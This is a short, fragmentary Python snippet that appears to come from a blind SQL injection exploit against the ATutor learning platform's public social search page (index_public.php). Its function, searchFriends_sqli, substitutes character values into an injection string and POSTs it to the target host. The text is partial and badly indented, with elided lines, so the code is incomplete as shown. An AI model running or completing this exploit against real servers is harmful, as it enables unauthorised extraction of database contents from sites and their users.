...
def searchFriends_sqli(ip, inj_str):
    ...
    # now we update the sqli         
        target = "http://%s/ATutor/mods/_standard/social/index_public.php"%(ip)   #"http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))         
        r = requests.post(target,str(inj_str.replace("[CHAR]", str(j)))  )         
    #print r.headers         
